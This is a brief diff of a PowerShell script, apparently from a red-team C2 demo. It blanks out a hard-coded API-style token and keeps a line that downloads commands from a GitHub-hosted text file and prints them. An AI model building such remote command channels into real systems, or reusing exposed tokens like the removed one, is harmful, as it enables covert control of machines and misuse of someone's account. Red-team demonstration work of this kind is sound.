@@ -1,6 +1,6 @@
 
 $BASEDIR = pwd
-$C2GB_token = 'sl.BWzBFL9YhxyKsOIZ3r6l90rMsP6LZ1LpEdoSXztMmbHD2MaCBlVxNCfsbWQzjYU-d-Zseo-8pbGw2AV-HXkFaKKRW97xkSt0tng79cI9W_sothITEcZGwSI1rHUlW-3DBAZ-sPEcffEg'
+$C2GB_token = ''
 
 $cmd = Invoke-webrequest -URI "https://raw.githubusercontent.com/roccosicilia/sToolz/master/RedTeam/C2demo/input.txt"
 Write-Host "Test del comando" + $cmd
